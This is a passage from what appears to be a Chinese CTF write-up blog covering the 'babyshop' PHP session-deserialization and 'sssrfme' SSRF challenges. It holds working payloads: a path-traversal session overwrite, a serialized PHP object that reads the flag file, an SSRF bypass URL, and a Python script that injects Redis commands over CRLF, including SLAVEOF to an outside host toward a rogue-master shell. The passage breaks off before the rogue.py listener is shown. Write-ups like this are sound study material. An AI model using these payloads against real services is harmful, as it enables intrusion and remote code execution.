class="language-pgsql">xxx</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryVQBCUL5NvVhHTcjT--</span></span></span><br></pre></td></tr></table></figure>



<h2 id="babyshop"><a href="#babyshop" class="headerlink" title="babyshop"></a><strong>babyshop</strong></h2><blockquote>
<p>反混淆 &amp; 任意文件读写 &amp; sess 反序列化</p>
</blockquote>
<p>.git源码泄露 但是被混淆了，代码不是很长，用xdebug慢慢调出来，这里贴一份@cjm00n人工解混淆的主要代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> 造齿轮</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$storage</span>;</span><br><span class="line">    <span class="keyword">protected</span> $贡品;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$sessionId</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$safeExt</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;storage = <span class="string">&quot;storage&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable language_">$this</span>-&gt;storage)) <span class="title function_ invoke__">mkdir</span>(<span class="variable language_">$this</span>-&gt;storage);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;safeExt = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;flag&quot;</span>, <span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params">$货物, $食物</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;safeExt <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_COOKIE</span>[$食物], <span class="variable">$item</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;invaild &#x27;</span> . $食物);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sessionId = <span class="title function_ invoke__">session_id</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">$货物, $食物</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;贡品 = $货物;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;storage . <span class="string">&#x27;/sess_&#x27;</span> . $货物, $食物) === <span class="literal">false</span> ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">$货物</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;贡品 = $货物;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">string</span>)@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable language_">$this</span>-&gt;storage . <span class="string">&quot;/sess_&quot;</span> . $货物);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeNote</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable language_">$this</span>-&gt;sessionId) &lt;= <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">getcwd</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;storage . <span class="string">&#x27;/note_&#x27;</span> . <span class="variable language_">$this</span>-&gt;sessionId, <span class="variable">$content</span>) === <span class="literal">false</span> ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNote</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">string</span>)@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable language_">$this</span>-&gt;storage . <span class="string">&#x27;/note_&#x27;</span> . <span class="variable language_">$this</span>-&gt;贡品);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 思考(<span class="params">$货物</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;贡品 = $货物;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable language_">$this</span>-&gt;storage . <span class="string">&#x27;/sess_&#x27;</span> . $货物)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable language_">$this</span>-&gt;storage . <span class="string">&#x27;/sess_&#x27;</span> . $货物);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params">$货物</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="title function_ invoke__">glob</span>(<span class="variable language_">$this</span>-&gt;storage . <span class="string">&#x27;/*&#x27;</span>) <span class="keyword">as</span> $元素) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">filemtime</span>($元素) + $货物 &lt; <span class="title function_ invoke__">time</span>() &amp;&amp; <span class="title function_ invoke__">file_exists</span>($元素)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>($元素);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">writeNote</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getNote</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&quot;D:\\CTF\\gactf2020\\babyshopsrc&quot;</span>);</span><br><span class="line">$齿轮 = <span class="keyword">new</span> 造齿轮();</span><br><span class="line"><span class="title function_ invoke__">session_set_save_handler</span>(<span class="keyword">array</span>($齿轮, <span class="string">&#x27;open&#x27;</span>), <span class="keyword">array</span>($齿轮, <span class="string">&#x27;close&#x27;</span>), <span class="keyword">array</span>($齿轮, <span class="string">&#x27;read&#x27;</span>), <span class="keyword">array</span>($齿轮, <span class="string">&#x27;write&#x27;</span>), <span class="keyword">array</span>($齿轮, <span class="string">&#x27;destroy&#x27;</span>), <span class="keyword">array</span>($齿轮, <span class="string">&#x27;close&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">mktime</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">$盛世 = <span class="keyword">array</span>(<span class="number">1186989435</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;alice&quot;</span>, <span class="number">0b1</span>), <span class="number">1847880546</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;bob&quot;</span>, <span class="number">0b101</span>), <span class="number">444424444</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;cat&quot;</span>, <span class="number">0b10100</span>), <span class="number">324870919</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;dog&quot;</span>, <span class="number">0b1111</span>), <span class="number">94267937</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>, <span class="number">0b101</span>), <span class="number">1889069619</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>, <span class="number">0b10011100001111</span>));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> 取经(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $盛世;</span><br><span class="line">    $宝藏 = <span class="string">&#x27;[&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;items&#x27;</span>] <span class="keyword">as</span> $元素) $宝藏 .= $盛世[$元素][<span class="number">0</span>] . <span class="string">&#x27;, &#x27;</span>;</span><br><span class="line">    $宝藏 .= <span class="string">&#x27;]&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> $宝藏;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> 念经(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $齿轮;</span><br><span class="line">    <span class="keyword">return</span> $齿轮-&gt;<span class="title function_ invoke__">getNote</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> 造世(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $盛世;</span><br><span class="line">    $宝藏 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($盛世 <span class="keyword">as</span> $按键 =&gt; $元素) $宝藏 .= <span class="string">&#x27;&lt;div class=&quot;item&quot;&gt;&lt;form method=&quot;POST&quot;&gt;&lt;div class=&quot;form-group&quot;&gt;&#x27;</span> . $元素[<span class="number">0</span>] . <span class="string">&#x27;&lt;/div&gt;&lt;div class=&quot;form-group&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;&#x27;</span> . $按键 . <span class="string">&#x27;&quot;&gt;&lt;button type=&quot;submit&quot; class=&quot;btn btn-success&quot;&gt;buy ($&#x27;</span> . $元素[<span class="number">1</span>] . <span class="string">&#x27;)&lt;/button&gt;&lt;/div&gt;&lt;/form&gt;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> $宝藏;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;balance&#x27;</span>])) <span class="variable">$_SESSION</span>[<span class="string">&#x27;balance&#x27;</span>] = <span class="number">4466</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;items&#x27;</span>])) <span class="variable">$_SESSION</span>[<span class="string">&#x27;items&#x27;</span>] = [];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;note&#x27;</span>])) <span class="variable">$_SESSION</span>[<span class="string">&#x27;note&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;balance&#x27;</span>] &gt;= $盛世[<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]][<span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;balance&#x27;</span>] = <span class="variable">$_SESSION</span>[<span class="string">&#x27;balance&#x27;</span>] - $盛世[<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]][<span class="number">1</span>];</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>($&#123;<span class="string">&#x27;_SESSION&#x27;</span>&#125;[<span class="string">&#x27;items&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;&lt;span style=&quot;color:green&quot;&gt;buy succ!&lt;/span&gt;&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;&lt;span style=&quot;color:red&quot;&gt;lack of balance!&lt;/span&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;note&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;note&#x27;</span>]) &lt;= <span class="number">1024</span>) &#123;</span><br><span class="line">        $齿轮-&gt;<span class="title function_ invoke__">writeNote</span>(<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;&amp;amp;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>), <span class="variable">$_POST</span>[<span class="string">&#x27;note&#x27;</span>]));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;&lt;span style=&quot;color:green&quot;&gt;write succ!&lt;/span&gt;&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;&lt;span style=&quot;color:red&quot;&gt;note too long!&lt;/span&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>简单来说就是用户会先生成一个sess文件，买东西的时候会更新，笔记部分会生一个另外的note文件，作简单的标签过滤，因为这里的文件名都是拼接出来的，所以导致了我们任意读写文件和触发session发序列化，不过限制不能含有<code>php</code>、<code>html</code>、<code>flag</code>、<code>htaccess</code>，这里主要是通过覆写sess文件来进行session反序列化</p>
<p>这里给出一个买flag的过程，也就是我们覆写sess文件的过程</p>
<p><strong>买flag流程：</strong></p>
<ol>
<li>先注册个id：45fe489991ade97ddb812783a7d438f7</li>
<li>写note：balance|i:9999;items|a:1:{i:0;s:10:”1186989435”;}note|s:0:””;</li>
<li>修改id：&#x2F;..&#x2F;note_45fe489991ade97ddb812783a7d438f7</li>
<li>就可以买flag了</li>
</ol>
<p>然后可以看到在<strong>造齿轮</strong>类的<code>__destruct</code>可以任意读写文件</p>
<p>贴上我们的payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> 造齿轮 </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $朝拜圣地 = <span class="string">&quot;storage&quot;</span>;</span><br><span class="line">	<span class="keyword">protected</span> $贡品 = <span class="string">&quot;1/../../../../../flag&quot;</span>;</span><br><span class="line">	<span class="keyword">protected</span> $圣殿 = <span class="string">&quot;1/../tyao&quot;</span>;</span><br><span class="line">	<span class="keyword">protected</span> $禁地;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> 造齿轮();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;balance&#x27;</span>] = <span class="number">9999</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;items&#x27;</span>] = [];</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;items&#x27;</span>], <span class="variable">$o</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后去把自己sess文件拿出来，重复上述买flag的部分，访问<code>storage/tyao</code>即可看到flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">balance%<span class="number">7</span>Ci%<span class="number">3</span>A9999%<span class="number">3</span>Bitems%<span class="number">7</span>Ca%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%E9%<span class="number">80</span>%A0%E9%BD%BF%E8%BD%AE%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A15%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>%E6%<span class="number">9</span>C%<span class="number">9</span>D%E6%<span class="number">8</span>B%<span class="number">9</span>C%E5%<span class="number">9</span>C%A3%E5%<span class="number">9</span>C%B0%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>storage%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>%E8%B4%A1%E5%<span class="number">93</span>%<span class="number">81</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">221</span>/../../../../../flag%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>%E5%<span class="number">9</span>C%A3%E6%AE%BF%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">221</span>/../tyao%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>%E7%A6%<span class="number">81</span>%E5%<span class="number">9</span>C%B0%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>



<h2 id="sssrfme"><a href="#sssrfme" class="headerlink" title="sssrfme"></a>sssrfme</h2><blockquote>
<p>SSRF + Python CRLF</p>
</blockquote>
<p>题目源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ini_set(&quot;display_errors&quot;, &quot;On&quot;);</span></span><br><span class="line"><span class="comment">// error_reporting(E_ALL | E_STRICT);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_url</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$safe</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$parsed</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="variable">$validate_ip</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$parsed</span>[<span class="string">&#x27;port&#x27;</span>]  &amp;&amp; !<span class="title function_ invoke__">in_array</span>(<span class="variable">$parsed</span>[<span class="string">&#x27;port&#x27;</span>],<span class="keyword">array</span>(<span class="string">&#x27;80&#x27;</span>,<span class="string">&#x27;443&#x27;</span>)))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;b&gt;请求错误:非正常端口,因安全问题只允许抓取80,443端口的链接,如有特殊需求请自行修改程序&lt;/b&gt;&quot;</span>.PHP_EOL;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d+$/&#x27;</span>, <span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>]) &amp;&amp; <span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>] = <span class="title function_ invoke__">long2ip</span>(<span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line">        <span class="variable">$long</span> = <span class="title function_ invoke__">ip2long</span>(<span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$long</span>===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$safe</span>)&#123;</span><br><span class="line">                @<span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;RES_OPTIONS=retrans:1 retry:1 timeout:1 attempts:1&#x27;</span>);</span><br><span class="line">                <span class="variable">$ip</span>   = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line">                <span class="variable">$long</span> = <span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>);</span><br><span class="line">                <span class="variable">$long</span>===<span class="literal">false</span> &amp;&amp; <span class="variable">$ip</span> = <span class="literal">null</span>;</span><br><span class="line">                @<span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;RES_OPTIONS&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ip</span> &amp;&amp; <span class="variable">$validate_ip</span> = <span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$parsed</span>[<span class="string">&#x27;scheme&#x27;</span>],<span class="keyword">array</span>(<span class="string">&#x27;http&#x27;</span>,<span class="string">&#x27;https&#x27;</span>)) || !<span class="variable">$validate_ip</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;b&gt;<span class="subst">&#123;$url&#125;</span> 请求错误:非正常URL格式,因安全问题只允许抓取 http:// 或 https:// 开头的链接或公有IP地址&lt;/b&gt;&quot;</span>.PHP_EOL;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$url</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">safe_url</span>(<span class="variable">$url</span>,<span class="variable">$safe</span>)) &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="literal">false</span>);</span><br><span class="line">        <span class="variable">$co</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$co</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">curl</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>用到的是php中parse_url和cURL的差异性，然后想办法通过CRLF打Redis</p>
<p>去bugs.php.net搜只搜到这篇与它相关</p>
<p><a href="https://bugs.php.net/bug.php?id=77991">https://bugs.php.net/bug.php?id=77991</a></p>
<p>内网地址可以这么绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://foo@127.0.0.1:6379%20@www.baidu.com/</span><br></pre></td></tr></table></figure>

<p>下一步应该就是用https协议的CRLF打Redis，但是打不出来</p>
<blockquote>
<p>赛后更新</p>
</blockquote>
<p>原来5000端口有东西，是个套娃提 : &gt;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello,world</span><br><span class="line">hint: 这是个套娃. http://localhost:5000/?url=https://baidu.com</span><br></pre></td></tr></table></figure>

<p>访问一下可以直接到baidu.com</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://foo@127.0.0.1:5000%20@www.baidu.com/%3Furl=https://baidu.com</span><br></pre></td></tr></table></figure>

<p>5000端口猜测是Flask服务，从消息头可以看出用的是Python-urllib&#x2F;3.7，这个库爆出过CRLF，刚好可以用来打Redis</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200902152136.png" alt="image-20200902140319742"></p>
<p>这里有个trick就是，怎么判断Redis命令是否执行成功，这里用到了SLAVEOF命令，可以向外网发送PING数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SLAVEOF vpsip vpsport</span><br></pre></td></tr></table></figure>

<p>认证直接使用AUTH pwd接口，经过爆破可以知道弱口令123456</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq</span><br><span class="line"></span><br><span class="line">target= <span class="string">&quot;http://45.77.217.198:10801&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string">auth 123456</span></span><br><span class="line"><span class="string">slaveof %s 9999</span></span><br><span class="line"><span class="string">foo: &#x27;&#x27;&#x27;</span> % <span class="string">&quot;xxx.xxx.xxx.xxx&quot;</span></span><br><span class="line"></span><br><span class="line">payload = urllib.parse.quote(payload).replace(<span class="string">&quot;%0A&quot;</span>, <span class="string">&quot;%0D%0A&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;?url=http://127.0.0.1:6379/&quot;</span> + payload</span><br><span class="line">payload = urllib.parse.quote(payload)</span><br><span class="line">payload = <span class="string">&quot;?url=http://foo@127.0.0.1:5000%20@www.baidu.com/&quot;</span> + payload</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">res = rq.get(target + payload)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<p>然后最后getshell是用到一个主从复制，参考以下链接</p>
<p><a href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a></p>
<p>编译exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd RedisModulesSDK</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p>创建rogue.py如下，服务器运行监听</p>
